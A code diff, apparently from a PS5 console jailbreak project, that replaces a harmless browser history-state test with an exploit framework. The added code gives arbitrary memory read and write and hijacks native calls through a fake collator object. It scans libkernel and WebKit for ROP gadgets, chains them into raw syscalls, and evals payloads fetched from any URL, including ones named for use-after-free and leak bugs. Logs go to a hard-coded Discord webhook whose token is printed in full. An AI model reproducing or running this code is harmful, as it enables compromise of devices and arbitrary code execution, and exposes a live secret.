+      return o;
+    }
+    function unpack(u8) {
+      let v = 0n;
+      for (let i = u8.length - 1; i >= 0; --i) v = (v << 8n) | BigInt(u8[i]);
+      return v;
+    }
+    function readW(addr, w) { return unpack(rdBytes(addr, w)); }
+    function writeW(addr, w, val) { wrBytes(addr, pack(val, w)); }
+    const read8 = (a) => Number(readW(a, 1));
+    const read16 = (a) => Number(readW(a, 2));
+    const read32 = (a) => Number(readW(a, 4));
+    const read64 = (a) => readW(a, 8);
+    const write8 = (a, v) => writeW(a, 1, v);
+    const write16 = (a, v) => writeW(a, 2, v);
+    const write32 = (a, v) => writeW(a, 4, v);
+    const write64 = (a, v) => writeW(a, 8, v);
+    function malloc(size) {
+      size = N(size);
+      size = (size + 7) & ~7;
+      if (size < 8) size = 8;
+      if (heapPtr + size > heapEnd) {
+        PS5.notes.push("heap-overflow " + size);
+        return 0n;
+      }
+      const p = BigInt(ctx.arenaBacking + heapPtr);
+      heapPtr += size;
+      wrBytes(p, new Uint8Array(Math.min(size, 0x100)));
+      if (size > 0x100) wrBytes(p + BigInt(0x100), new Uint8Array(size - 0x100));
+      return p;
+    }
+    function free(p) {}
+    function alloc_string(s) {
+      s = String(s);
+      const p = malloc(s.length + 1);
+      if (!p) return 0n;
+      const u = new Uint8Array(s.length + 1);
+      for (let i = 0; i < s.length; ++i) u[i] = s.charCodeAt(i) & 0xff;
+      wrBytes(p, u);
+      return p;
+    }
+    function swapIn() {
+      const v = ctx.aim(ctx.collatorCell + 0x18);
+      const p = pack(ctx.fakeCollator, 6);
+      for (let i = 0; i < 6; ++i) v[i] = p[i];
+      v[6] = 0; v[7] = 0;
+    }
+    function swapOut() {
+      const v = ctx.aim(ctx.collatorCell + 0x18);
+      for (let i = 0; i < ctx.collatorSaved.length; ++i)
+        v[i] = ctx.collatorSaved[i];
+    }
+    function nativeCall(target, rdi, rcx, req) {
+      const A = ctx.arena;
+      for (let i = 0; i < 8; ++i) {
+        A[0x100 + 0x48 + i] = Number(B(rdi) >> BigInt(8 * i)) & 0xff;
+        A[0x100 + 0x60 + i] = Number(B(rcx) >> BigInt(8 * i)) & 0xff;
+        A[0x100 + 0xE0 + i] = Number(B(target) >> BigInt(8 * i)) & 0xff;
+      }
+      swapIn();
+      try { return ctx.compare(req === undefined ? "" : String(req)); }
+      finally { swapOut(); }
+    }
+    function send_notification(msg) {
+      try {
+        const r = nativeCall(ctx.notifyEntry, 0, 0, ctx.requestPadded(msg));
+        return r === 0;
+      } catch (e) { return false; }
+    }
+    const KTEXT = 0x44000;
+    const GADPAT = {
+      poprax:[0x58,0xc3], poprdi:[0x5f,0xc3], poprsi:[0x5e,0xc3],
+      poprdx:[0x5a,0xc3], popr10:[0x41,0x5a,0xc3], popr8:[0x41,0x58,0xc3],
+      popr9:[0x41,0x59,0xc3], poprsp:[0x5c,0xc3], ret:[0xc3],
+      syscall:[0x0f,0x05,0xc3], store:[0x48,0x89,0x07,0xc3],
+      save:[0x48,0x89,0x27,0xc3], pivot:[0x48,0x89,0xe7,0xc3]
+    };
+    const PIVOT_ALT = [[0x48,0x8b,0xe7,0xc3],[0x57,0x5c,0xc3]];
+    function findPat(mem, base, pat) {
+      outer:
+      for (let i = 0; i + pat.length <= mem.length; ++i) {
+        for (let j = 0; j < pat.length; ++j)
+          if (mem[i + j] !== pat[j]) continue outer;
+        return base + i;
+      }
+      return null;
+    }
+    function scanGadgets() {
+      const g = {};
+      const kbase = (PS5.libkernelBase > 0x800000000 && PS5.libkernelBase < 0x900000000)
+        ? PS5.libkernelBase : ctx.libkernelBase;
+      const CHUNK = 0x2000, OVER = 16;
+      for (let off = 0; off < KTEXT; off += CHUNK) {
+        const mem = rdBytes(kbase + off, lenFor(off));
+        const memBase = kbase + off;
+        for (const k in GADPAT) {
+          if (g[k] !== undefined && g[k] !== null) continue;
+          const f = findPat(mem, memBase, GADPAT[k]);
+          if (f !== null) g[k] = f;
+        }
+        if (g.pivot === null || g.pivot === undefined) {
+          for (const alt of PIVOT_ALT) {
+            const f = findPat(mem, memBase, alt);
+            if (f !== null) { g.pivot = f; break; }
+          }
+        }
+      }
+      PS5.gadgets = g;
+      const missing = Object.keys(GADPAT).concat(["pivot"]).filter(
+        (k) => g[k] === undefined || g[k] === null);
+      if (missing.length) {
+        PS5.notes.push("rop-missing:" + missing.join(","));
+        return false;
+      }
+      return true;
+    }
+    function lenFor(off) { return Math.min(0x2000 + 16, KTEXT - off); }
+    function ropProbe() {
+      const qp = (function () {
+        try { return new URLSearchParams(location.search).get("rop"); }
+        catch (e) { return null; }
+      })();
+      if (qp === "0") { PS5.notes.push("rop-forced-direct"); return false; }
+      const base = (PS5.libkernelBase > 0x800000000 && PS5.libkernelBase < 0x900000000)
+        ? PS5.libkernelBase : ctx.libkernelBase;
+      if (!(base > 0x800000000 && base < 0x900000000)) {
+        PS5.notes.push("rop-no-libkernel-base:" + HEX(base || 0)
+          + " (offsets 13.x no validaron)");
+        return false;
+      }
+      try {
+        const v = ctx.aim(base);
+        if (v === null || v === undefined) {
+          PS5.notes.push("rop-probe-null");
+          return false;
+        }
+        PS5.notes.push("rop-probe-ok:0x" + (v[0] & 0xff).toString(16));
+        return true;
+      } catch (e) {
+        PS5.notes.push("rop-probe-threw:" + String(e.message || e).slice(0, 40));
+        return false;
+      }
+    }
+    const WEBKIT_TEXT_SIZE = 0x2c7c000;
+    const WK_PATTERNS = {
+      poprdi:[0x5f,0xc3], poprsi:[0x5e,0xc3], poprdx:[0x5a,0xc3],
+      poprcx:[0x59,0xc3], poprax:[0x58,0xc3], poprsp:[0x5c,0xc3],
+      popr8:[0x41,0x58,0xc3], popr9:[0x41,0x59,0xc3],
+      store:[0x48,0x89,0x07,0xc3], ret:[0xc3]
+    };
+    const WK_NAME = {
+      poprdi:"pop rdi", poprsi:"pop rsi", poprdx:"pop rdx",
+      poprcx:"pop rcx", poprax:"pop rax", poprsp:"pop rsp",
+      popr8:"pop r8", popr9:"pop r9",
+      store:"mov [rdi], rax", ret:"ret"
+    };
+    function pickX1non() {
+      try {
+        const T = (typeof window !== "undefined") ? window.X1NON_13X : null;
+        if (!T) { PS5.notes.push("wk-no-table"); return null; }
+        if (T[PS5.fw]) return T[PS5.fw];
+        const parts = String(PS5.fw).split(".");
+        const want = parseInt(parts[0], 10) * 100 + parseInt(parts[1] || "0", 10);
+        const maj = parts[0];
+        let best = null, bestD = 1e9;
+        for (const k in T) {
+          if (k.split(".")[0] !== maj) continue;
+          const p = k.split(".");
+          const n = parseInt(p[0], 10) * 100 + parseInt(p[1], 10);
+          const d = Math.abs(n - want);
+          if (d < bestD) { bestD = d; best = k; }
+        }
+        if (best) { PS5.notes.push("wk-nearest:" + best); return T[best]; }
+      } catch (e) { PS5.notes.push("wk-pick-threw"); }
+      PS5.notes.push("wk-no-table");
+      return null;
+    }
+    function scanWkPattern(pat) {
+      const CHUNK = 0x2000;
+      for (let off = 0; off < WEBKIT_TEXT_SIZE; off += CHUNK) {
+        let mem;
+        try { mem = rdBytes(ctx.webkitBase + off, Math.min(CHUNK + 16, WEBKIT_TEXT_SIZE - off)); }
+        catch (e) { PS5.notes.push("wk-scan-fault@" + off.toString(16)); return null; }
+        const f = findPat(mem, ctx.webkitBase + off, pat);
+        if (f !== null) return f;
+      }
+      return null;
+    }
+    function tryWkFallback() {
+      const x = pickX1non();
+      if (!x) return false;
+      const kbase = (PS5.libkernelBase > 0x800000000 && PS5.libkernelBase < 0x900000000)
+        ? PS5.libkernelBase : ctx.libkernelBase;
+      if (!(kbase > 0x800000000 && kbase < 0x900000000)) {
+        PS5.notes.push("wk-no-libkernel-base");
+        return false;
+      }
+      try {
+        const p = ctx.aim(ctx.webkitBase);
+        if (p === null || p === undefined) { PS5.notes.push("wk-probe-null"); return false; }
+        PS5.notes.push("wk-probe-ok");
+      } catch (e) {
+        PS5.notes.push("wk-probe-threw:" + String(e.message || e).slice(0, 40));
+        return false;
+      }
+      const g = {};
+      for (const key of Object.keys(WK_PATTERNS)) {
+        const name = WK_NAME[key];
+        const rva = x.wkGadgets[name];
+        if (!rva) { PS5.notes.push("wk-missing-gadget:" + name); return false; }
+        try {
+          const v = ctx.aim(ctx.webkitBase + rva);
+          const pat = WK_PATTERNS[key];
+          for (let i = 0; i < pat.length; ++i) {
+            if ((v[i] & 0xff) !== pat[i]) {
+              PS5.notes.push("wk-bad-bytes:" + name);
+              return false;
+            }
+          }
+          g[key] = ctx.webkitBase + rva;
+        } catch (e) {
+          PS5.notes.push("wk-read-threw:" + name);
+          return false;
+        }
+      }
+      g.pivot = scanWkPattern([0x48,0x8b,0xe7,0xc3]);
+      if (g.pivot === null) g.pivot = scanWkPattern([0x57,0x5c,0xc3]);
+      if (g.pivot === null) { PS5.notes.push("wk-no-pivot"); return false; }
+      g.save = scanWkPattern([0x48,0x89,0x27,0xc3]);
+      if (g.save === null) { PS5.notes.push("wk-no-save-gadget"); return false; }
+      PS5.stubs = {};
+      for (const numStr in x.syscallStubs)
+        PS5.stubs[numStr] = kbase + x.syscallStubs[numStr];
+      PS5.gadgets = g;
+      PS5.stubMode = true;
+      PS5.notes.push("wk-mode-ok:stubs=" + Object.keys(PS5.stubs).length
+        + " pivot=0x" + g.pivot.toString(16));
+      return true;
+    }
+    const OFF_RES = 0x480, OFF_R0 = 0x488;
+    function syscallROP(num, args) {
+      const g = PS5.gadgets;
+      nativeCall(g.save, ctx.arenaBacking + OFF_R0, 0, "");
+      const R0 = Number(read64(ctx.arenaBacking + OFF_R0));
+      if (!(R0 > 0x100000000 && R0 < 0x1000000000000))
+        throw new Error("rsp-garbage:" + HEX(R0));
+      let S;
+      if (PS5.stubMode) {
+        const stub = PS5.stubs && PS5.stubs[String(num)];
+        if (stub === undefined)
+          throw new Error("syscall-" + num + "-no-stub-in-table");
+        S = [
+          g.poprdi, Number(B(args[0] === undefined ? 0 : args[0])),
+          g.poprsi, Number(B(args[1] === undefined ? 0 : args[1])),
+          g.poprdx, Number(B(args[2] === undefined ? 0 : args[2])),
+          g.poprcx, Number(B(args[3] === undefined ? 0 : args[3])),
+          g.popr8, Number(B(args[4] === undefined ? 0 : args[4])),
+          g.popr9, Number(B(args[5] === undefined ? 0 : args[5])),
+          Number(B(stub)),
+          g.poprdi, ctx.arenaBacking + OFF_RES,
+          g.store,
+          g.poprsp, R0
+        ];
+      } else {
+        S = new Array(20).fill(0);
+        S[0] = g.poprax; S[1] = num;
+        const pops = [g.poprdi, g.poprsi, g.poprdx, g.popr10, g.popr8, g.popr9];
+        for (let i = 0; i < 6; ++i) {
+          S[2 + i * 2] = pops[i];
+          S[3 + i * 2] = Number(B(args[i] === undefined ? 0 : args[i]));
+        }
+        S[14] = g.syscall;
+        S[15] = g.poprdi; S[16] = ctx.arenaBacking + OFF_RES;
+        S[17] = g.store;
+        S[18] = g.poprsp;
+        S[19] = R0;
+      }
+      const q = new Uint8Array(S.length * 8);
+      for (let i = 0; i < S.length; ++i) {
+        const p = pack(S[i], 8);
+        for (let j = 0; j < 8; ++j) q[i * 8 + j] = p[j];
+      }
+      const CB = ctx.arenaBacking + chainBase;
+      wrBytes(CB, q);
+      nativeCall(g.pivot, CB, 0, "");
+      const r = read64(ctx.arenaBacking + OFF_RES);
+      const rs = BigInt.asIntN(64, r);
+      if (rs < 0n && rs > -132n) {
+        lastErr = Number(-rs);
+        return -1n;
+      }
+      lastErr = 0;
+      return rs;
+    }
+    function syscallDirect(num, args) {
+      throw new Error("syscall-" + num + "-unavailable:rop-gadgets-missing");
+    }
+    const SYSN = {
+      read:0x3, write:0x4, open:0x5, close:0x6, unlink:0xa,
+      chmod:0xf, getpid:0x14, kill:0x25, pipe:0x2a,
+      ioctl:0x36, munmap:0x49, mprotect:0x4a, fcntl:0x5c,
+      select:0x5d, dup2:0x5a, fsync:0x5f, socket:0x61,
+      connect:0x62, bind:0x68, setsockopt:0x69, listen:0x6a,
+      getsockopt:0x76, getsockname:0x20, netgetiflist:0x7d,
+      sendto:0x85, recvfrom:0x1d, accept:0x1e, mkdir:0x88,
+      rmdir:0x89, rename:0x80, stat:0xbc, fstat:0xbd,
+      getdents:0x110, sysctl:0xca, nanosleep:0xf0,
+      sched_yield:0x14b, sigaction:0x1a0, thr_self:0x1b0,
+      thr_new:0x1c7, thr_exit:0x1af, umtx_op:0x1c6,
+      dlsym:0x24f, dynlib_load_prx:0x252, dynlib_unload_prx:0x253,
+      randomized_path:0x25a, is_in_sandbox:0x249, mmap:0x1dd,
+      lseek:0x1de, ftruncate:0x1e0, jitshm_create:0x215,
+      jitshm_alias:0x216, cpuset_getaffinity:0x1e7,
+      cpuset_setaffinity:0x1e8, rtprio_thread:0x1d2,
+      get_aio_debug_request_info:0x2d7
+    };
+    function syscall(which, ...args) {
+      let num = which;
+      if (typeof which === "string" || (typeof which !== "number" && typeof which !== "bigint"))
+        num = SYSN[String(which)] !== undefined ? SYSN[String(which)] : which;
+      num = Number(B(num));
+      if (PS5.mode === "ROP") return syscallROP(num, args);
+      return syscallDirect(num, args);
+    }
+    function get_error_string() { return lastErr + ": " + (ELM[lastErr] || ""); }
+    function boot(c) {
+      ctx = c;
+      PS5.fw = c.fw;
+      PS5.webkitBase = c.webkitBase;
+      PS5.libkernelBase = c.libkernelBase;
+      try {
+        const kb = c.libkernelBase;
+        const inBand = (x) => x > 0x800000000 && x < 0x900000000 && (x % 0x4000 === 0);
+        if (!inBand(kb) && c.kernelBaseCandidates) {
+          const cds = c.kernelBaseCandidates;
+          const list = [["getpid", cds.getpid], ["close", cds.close], ["error", cds.error]];
+          PS5.notes.push("kbase-candidates:"
+            + list.map(([n, v]) => n + "=" + HEX(v)).join(","));
+          for (const [n, v] of list) {
+            if (inBand(v)) {
+              PS5.notes.push("kbase-recovered-from:" + n + "=" + HEX(v));
+              PS5.libkernelBase = v;
+              break;
+            }
+          }
+        }
+      } catch (e) { PS5.notes.push("kbase-diag-threw:" + String(e.message || e).slice(0, 40)); }
+      heapPtr = 0x2000; heapEnd = 0x8000; chainBase = 0x8000;
+      PS5.mallocEnd = heapEnd;
+      try {
+        if (ctx.arena[0xf00] === 0x52 && ctx.arena[0xf03] === 0x31)
+          PS5.notes.push("arena-sentinel-ok");
+      } catch (e) {}
+      let ropOK = false;
+      try { if (ropProbe()) ropOK = scanGadgets(); }
+      catch (e) { PS5.notes.push("scan-threw:" + String(e.message || e).slice(0, 60)); }
+      if (!ropOK) {
+        try { ropOK = tryWkFallback(); }
+        catch (e) { PS5.notes.push("wk-fb-threw:" + String(e.message || e).slice(0, 60)); }
+      }
+      PS5.mode = ropOK ? "ROP" : "DIRECT";
+      PS5.ready = true;
+      global.malloc = malloc;
+      global.free = free;
+      global.alloc_string = alloc_string;
+      global.read8 = read8; global.read16 = read16;
+      global.read32 = read32; global.read64 = read64;
+      global.write8 = write8; global.write16 = write16;
+      global.write32 = write32; global.write64 = write64;
+      global.syscall = syscall;
+      global.SYSCALL = SYSN;
+      global.SYSCALL_STUBS = PS5.stubs;
+      global.get_error_string = get_error_string;
+      global.send_notification = send_notification;
+      global.PS5call = nativeCall;
+      try {
+        const pid = syscall(SYSN.getpid);
+        send_notification("userland-bridge OK fw=" + PS5.fw + " pid=" + pid + " modo=" + PS5.mode);
+        httpLog("BRIDGE-BOOT fw=" + PS5.fw + " mode=" + PS5.mode
+          + " wk=" + HEX(c.webkitBase) + " libk=" + HEX(c.libkernelBase)
+          + " pid=" + pid + " notes=" + PS5.notes.join(";"));
+      } catch (e) {
+        httpLog("BRIDGE-BOOT-PARTIAL " + String(e.message || e));
+      }
+      if (typeof global.onBridgeReady === "function") {
+        try { global.onBridgeReady(PS5); } catch (e) {}
+      }
+    }
+    global.onUserland = function () { boot(window.__PS5_CTX); };
+  })(typeof window !== "undefined" ? window : globalThis);
+
+  // -------------------------------------------------------------------
+  // MENU  (from modules/menu.js, IIFE preserved)
+  // -------------------------------------------------------------------
+  (function (global) {
+    const QP = new URLSearchParams(location.search);
+    let pb = QP.get("pb") || "payloads/";
+    if (!pb.endsWith("/")) pb += "/";
+    const DEF_PAYLOAD = "userland_check_3x.js";
+    let auto = QP.get("auto");
+    if (auto === null) auto = DEF_PAYLOAD;
+    let autoTimer = 0;
+    const KNOWN = [
+      "userland_check_3x.js",
+      "hello_1320.js",
+      "aio_reach_1320.js",
+      "bagagwa_uaf_1320.js",
+      "syscall727_leak.js",
+      "osem_convert_1320.js",
+      "osem_campaign_1320.js",
+      "osem2_1320.js",
+      "netcontrol_poc_1320.js",
+      "netctl5_variants_1320.js",
+      "devprobe_1320.js",
+      "fs_probe_1320.js",
+      "usb_probe_1320.js"
+    ];
+    let css = document.createElement("style");
+    css.textContent =
+      "#pnl{position:fixed;right:8px;top:56px;width:340px;max-height:80vh;" +
+      "overflow:auto;background:#060a10;border:1px solid #0d1825;border-radius:6px;" +
+      "padding:10px;font-family:Consolas,monospace;font-size:11px;color:#c0d0e8;" +
+      "z-index:50;display:none}" +
+      "#pnl button{background:#0057e0;color:#fff;border:0;border-radius:4px;" +
+      "padding:6px 10px;font-weight:600;cursor:pointer;margin:2px}" +
+      "#pnl button:disabled{opacity:.45;cursor:not-allowed}" +
+      "#pnl input{width:150px;background:#030508;color:#c0d0e8;" +
+      "border:1px solid #0d1825;border-radius:4px;padding:4px}" +
+      "#plg{background:#030508;border:1px solid #0d1825;border-radius:4px;" +
+      "height:280px;overflow:auto;white-space:pre-wrap;padding:6px;margin-top:6px;" +
+      "-webkit-overflow-scrolling:touch}" +
+      "#pnl .h{color:#e8f0ff;font-weight:700;letter-spacing:.1em}" +
+      "#dlfab{position:fixed;right:8px;bottom:8px;z-index:60;" +
+      "background:#555f00;color:#fff;border:0;border-radius:4px;" +
+      "padding:8px 12px;font:600 11px Consolas,monospace;cursor:pointer;" +
+      "box-shadow:0 2px 10px rgba(0,0,0,.6)}";
+    document.head.appendChild(css);
+    const pnl = document.createElement("div");
+    pnl.id = "pnl";
+    pnl.innerHTML =
+      '<span class="h">BragaTy · PAYLOADS</span> ' +
+      '<span id="pmode">—</span><br>' +
+      '<select id="psel"></select> <input id="pcustom" placeholder="o archivo.js">' +
+      '<div><button id="prun" disabled>RUN</button>' +
+      '<button id="ptestall" style="background:#0d7a52" disabled>TEST ALL</button>' +
+      '<button id="pgithub" style="background:#6f42c1">GITHUB LOG</button>' +
+      '<button id="pdiscord" style="background:#5865f2">SEND TO DISCORD</button>' +
+      '<button id="pstop" style="background:#552222">RESET</button>' +
+      '<button id="pstop2" style="background:#7a1f1f">STOP</button>' +
+      '<button id="plogdl" style="background:#555f00">DOWNLOAD LOG</button>' +
+      '<button id="plogclr" style="background:#333">CLEAR</button></div>' +
+      'URL: <input id="purl" style="width:290px" placeholder="http://host/payload.js">' +
+      '<div><button id="purlrun" style="background:#00764f" disabled>RUN URL</button></div>' +
+      '<div id="plg">ready.</div>';
+    document.body.appendChild(pnl);
+    pnl.style.display = "block";
+    pnl.querySelector("#pmode").textContent = "waiting for bridge…";
+    const dlfab = document.createElement("button");
+    dlfab.id = "dlfab";
+    dlfab.textContent = "DOWNLOAD LOG";
+    document.body.appendChild(dlfab);
+    const sel = pnl.querySelector("#psel");
+    if (auto && auto !== "0" && KNOWN.indexOf(auto) < 0)
+      KNOWN.unshift(auto);
+    for (const k of KNOWN) {
+      const o = document.createElement("option");
+      o.textContent = k;
+      sel.appendChild(o);
+      if (k === auto) sel.value = k;
+    }
+    const LOG_CAP = 20000;
+    const STORE_KEY = "psaito:log";
+    const logBuf = [];
+    let storeTimer = 0, storeDirty = false;
+    try {
+      const saved = localStorage.getItem(STORE_KEY);
+      if (saved) { const lines = saved.split("\n"); for (const l of lines) logBuf.push(l); }
+    } catch (e) {}
+    function persistLog() {
+      storeDirty = true;
+      if (storeTimer) return;
+      storeTimer = setTimeout(() => {
+        storeTimer = 0;
+        if (!storeDirty) return;
+        storeDirty = false;
+        try { localStorage.setItem(STORE_KEY, logBuf.join("\n")); } catch (e) {}
+      }, 500);
+    }
+    function logAll(s) {
+      s = String(s);
+      logBuf.push(s);
+      if (logBuf.length > LOG_CAP) logBuf.splice(0, logBuf.length - LOG_CAP);
+      persistLog();
+    }
+    let scrLast = "";
+    function captureScr() {
+      try {
+        const scr = document.getElementById("scr");
+        if (!scr) return;
+        const txt = scr.textContent || "";
+        if (txt === scrLast) return;
+        if (scrLast && txt.startsWith(scrLast)) {
+          const delta = txt.slice(scrLast.length).replace(/^\n+/, "");
+          if (delta) logAll("[scr] " + delta);
+        } else if (!scrLast) {
+          const first = txt.replace(/^Waiting for exploit to start…\s*/, "").trim();
+          if (first) logAll("[scr] " + first);
+        } else {
+          logAll("[scr] " + txt.split("\n").slice(-1)[0]);
+        }
+        scrLast = txt;
+      } catch (e) {}
+    }
+    try {
+      const scrEl = document.getElementById("scr");
+      if (scrEl && window.MutationObserver) {
+        new MutationObserver(captureScr).observe(scrEl,
+          { childList: true, characterData: true, subtree: true });
+      } else if (typeof setInterval === "function") {
+        setInterval(captureScr, 1000);
+      }
+    } catch (e) {}
+    function glog(s) {
+      logAll(s);
+      const d = pnl.querySelector("#plg");
+      const atBottom = d.scrollHeight - d.scrollTop - d.clientHeight < 24;
+      d.textContent = (d.textContent + "\n" + s).split("\n").slice(-1000).join("\n");
+      if (atBottom) d.scrollTop = d.scrollHeight;
+    }
+    function bridgeApiReady() {
+      return !!(global.PS5 && global.PS5.ready === true
+        && typeof global.syscall === "function"
+        && typeof global.SYSCALL === "object");
+    }
+    function setPayloadControlsEnabled(enabled) {
+      for (const id of ["#prun", "#ptestall", "#purlrun"])
+        pnl.querySelector(id).disabled = !enabled;
+    }
+    global.__psaitoLog = () => logBuf.join("\n");
+    global.__psaitoAppend = (s) => logAll(s);
+    global.__psaitoRunPayload = function (name) { runFile(name); };
+    function downloadLog() {
+      try {
+        const stamp = new Date().toISOString().replace(/[:.]/g, "-");
+        const name = "psaito_log_" + stamp + ".txt";
+        const blob = new Blob([logBuf.join("\n")], { type: "text/plain" });
+        const a = document.createElement("a");
+        a.href = URL.createObjectURL(blob);
+        a.download = name;
+        a.style.display = "none";
+        document.body.appendChild(a);
+        a.click();
+        setTimeout(() => { URL.revokeObjectURL(a.href); a.remove(); }, 5000);
+        glog("== log downloaded: " + name + " ==");
+      } catch (e) { glog("!! download not supported: " + e); }
+    }
+    function fetchText(url, cb) {
+      try {
+        const x = new XMLHttpRequest();
+        x.open("GET", url, true);
+        x.onload = () => cb(x.status === 200 ? null : "http" + x.status, x.responseText);
+        x.onerror = () => cb("network", null);
+        x.send();
+      } catch (e) { cb("throw:" + e, null); }
+    }
+    const PUBLIC_DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1553463314422698085/tmWHGyzq7leGIFI1km9VbvnkVRsTexrL-JOsdPVoWoMR1AF7sfHVcx-zbf_DFbW2BEMj";
+    async function uploadDiscordLog(label, text, filename) {
+      if (!text || !String(text).trim()) throw new Error("log is empty");
+      const payloadText = String(text).trim();
       const form = new FormData();
       form.append("payload_json", JSON.stringify({
-        content: "Safe WebKit history-state test log",
+        content: `PS5 run: ${String(label).slice(0, 350)}`,
         allowed_mentions: { parse: [] }
       }));
-      const filename = "history-state-test-" + new Date().toISOString().replace(/[:.]/g, "-") + ".txt";
-      form.append("files[0]", new Blob([logLines.join("\n") + "\n"], { type: "text/plain;charset=utf-8" }), filename);
-      try {
-        await fetch(webhookUrl + "?wait=true", {
-          method: "POST",
-          body: form,
-          mode: "no-cors",
-          credentials: "omit",
-          referrerPolicy: "no-referrer"
-        });
-        line("Discord upload request submitted. Check the webhook channel; this browser cannot read Discord's cross-origin receipt.");
-      } catch (error) {
-        line("Discord upload request failed: " + String(error && error.message || error));
-      } finally {
-        sendButton.disabled = false;
-      }
-    }
-
-    function stopActive(message) {
-      const job = activeTraversal;
-      if (!job) return;
-      activeTraversal = null;
-      clearTimeout(job.timeout);
-      line(message);
-      job.resolve(false);
-    }
-
-    window.addEventListener("popstate", (event) => {
-      const job = activeTraversal;
-      if (!job) return;
-
-      const state = event.state;
-      if (state && state.testRun === job.token && state.phase === "baseline") {
-        if (!job.forwardRequested) {
-          job.forwardRequested = true;
-          setTimeout(() => history.forward(), 0);
-        }
-        return;
-      }
-
-      if (state && state.testRun === job.token && state.phase === "sample") {
-        try {
-          const passed = job.verify(state.value);
-          activeTraversal = null;
-          clearTimeout(job.timeout);
-          line(`${passed ? "PASS" : "FAIL"} ${job.name}: restored value verified after Back/Forward`);
-          job.resolve(passed);
-        } catch (error) {
-          stopActive(`FAIL ${job.name}: verification threw ${String(error && error.message || error)}`);
-        }
-        return;
-      }
-
-      stopActive(`FAIL ${job.name}: traversal returned unexpected history state`);
-    });
-
-    function testAfterTraversal(name, value, verify) {
-      return new Promise((resolve) => {
-        const token = "safe-history-test-" + Date.now().toString(36) + "-" + Math.random().toString(36).slice(2, 8);
-        const job = {
-          token,
-          name,
-          verify,
-          resolve,
-          forwardRequested: false,
-          timeout: 0
-        };
-        activeTraversal = job;
-        job.timeout = setTimeout(() => {
-          stopActive(`FAIL ${name}: no matching popstate event within 5 seconds; stopping further traversal tests`);
-        }, 5000);
-
-        try {
-          history.pushState({ testRun: token, phase: "baseline" }, "", location.href);
-          history.pushState({ testRun: token, phase: "sample", value }, "", location.href);
-          const immediate = history.state;
-          if (!immediate || immediate.testRun !== token || immediate.phase !== "sample" || !verify(immediate.value)) {
-            stopActive(`FAIL ${name}: immediate history.state read did not match`);
-            return;
-          }
-          line(`PASS ${name}: pushState and immediate state read`);
-          setTimeout(() => history.back(), 0);
-        } catch (error) {
-          stopActive(`FAIL ${name}: pushState threw ${String(error && error.name || "Error")}: ${String(error && error.message || error)}`);
-        }
+      form.append("files[0]", new Blob([payloadText], { type: "text/plain;charset=utf-8" }),
+        String(filename).replace(/[^a-zA-Z0-9_.-]/g, "_").slice(0, 100));
+      await fetch(PUBLIC_DISCORD_WEBHOOK + "?wait=true", {
+        method: "POST", body: form, mode: "no-cors",
+        cache: "no-store", credentials: "omit", referrerPolicy: "no-referrer"
       });
     }
-
-    async function runTests() {
-      button.disabled = true;
-      sendButton.disabled = true;
-      logLines.length = 0;
-      output.textContent = "";
-      line("Started: " + new Date().toISOString());
-      line("User agent: " + navigator.userAgent);
-      line("Only this test report is sent to the configured public Discord webhook.");
-      line("Each test uses a few small values and same-document history entries.");
-
-      const cases = [
-        {
-          name: "primitive string",
-          value: "safe history-state sample",
-          verify: (v) => v === "safe history-state sample"
-        },
-        {
-          name: "nested plain object",
-          value: { label: "sample", count: 3, items: ["a", 7, false], child: { ok: true } },
-          verify: (v) => !!v && v.label === "sample" && v.count === 3
-            && Array.isArray(v.items) && v.items.length === 3
-            && v.items[0] === "a" && v.items[1] === 7 && v.items[2] === false
-            && !!v.child && v.child.ok === true
-        },
-        {
-          name: "Date",
-          value: new Date("2024-01-02T03:04:05.000Z"),
-          verify: (v) => v instanceof Date && v.toISOString() === "2024-01-02T03:04:05.000Z"
-        },
-        {
-          name: "small typed array",
-          value: new Uint8Array([0, 1, 127, 255]),
-          verify: (v) => v instanceof Uint8Array && v.length === 4
-            && v[0] === 0 && v[1] === 1 && v[2] === 127 && v[3] === 255
-        }
-      ];
-
-      let passed = 0;
-      for (const sample of cases) {
-        const ok = await testAfterTraversal(sample.name, sample.value, sample.verify);
-        if (!ok) break;
-        passed++;
+    async function sendFullLogToDiscord(label = "MANUAL PS5 run log") {
+      captureScr();
+      const text = logBuf.join("\n");
+      if (!text || !text.trim()) { glog("!! no log content to send"); return; }
+      try {
+        const stamp = new Date().toISOString().replace(/[:.]/g, "-");
+        await uploadDiscordLog("**" + label + "**", text, `ps5-run-${stamp}.log.txt`);
+        glog("== Discord webhook upload request submitted ==");
+      } catch (e) {
+        glog("!! Discord log upload failed: " + String(e && e.message || e));
       }
-      const total = cases.length;
-      line("");
-      line(`RESULT: ${passed}/${total} traversal tests passed.`);
-      line("This checks browser history serialization/restoration only; it says nothing about exploitability or kernel access.");
-      button.disabled = false;
-      sendButton.disabled = false;
-      await sendLog();
+    }
+    global.__psaitoRunComplete = function (detail) {
+      const attempt = detail && detail.attempt ? detail.attempt : "final";
+      sendFullLogToDiscord(`Exploit stopped after ${attempt} attempts`);
+    };
+    async function runSource(name, src) {
+      if (!bridgeApiReady()) {
+        glog("!! blocked payload launch: bridge API is not ready");
+        return;
+      }
+      glog("== run " + name + " (" + src.length + "B) ==");
+      let ok = true;
+      try {
+        let result = (0, eval)(src);
+        if (result && typeof result.then === "function") result = await result;
+        if (result === false) {
+          ok = false;
+          glog("!! payload reported unsuccessful completion: " + name);
+        } else {
+          glog("== end " + name + " ==");
+        }
+      } catch (e) {
+        ok = false;
+        glog("!! ERROR " + name + ": " + (e && e.message || e));
+      }
+      if (name === "userland_check_3x.js") {
+        await sendFullLogToDiscord(
+          ok ? "Three safe userland checks completed" : "Three safe userland checks failed");
+      }
+    }
+    function runFile(name) {
+      fetchText(pb + encodeURIComponent(name), (err, src) => {
+        if (err) {
+          glog("!! fetch " + name + ": " + err);
+          return;
+        }
+        runSource(name, src);
+      });
+    }
+    function runNamed() {
+      runFile((pnl.querySelector("#pcustom").value.trim()) || sel.value);
+    }
+    function openGitHubIssueWithLog() {
+      const title = "PS5 payload test log " + new Date().toISOString().replace(/[:.]/g, "-");
+      const body = ["## Console log", "", "```text", logBuf.join("\n"), "```",
+        "", "## Browser", "- User agent: " + navigator.userAgent,
+        "- URL: " + location.href].join("\n");
+      const url = "https://github.com/So9aa/hope-ds-work/issues/new?title="
+        + encodeURIComponent(title) + "&body=" + encodeURIComponent(body);
+      try {
+        window.open(url, "_blank", "noopener,noreferrer");
+        glog("== opened GitHub issue draft ==");
+      } catch (e) { glog("!! GitHub issue draft failed: " + e); }
+    }
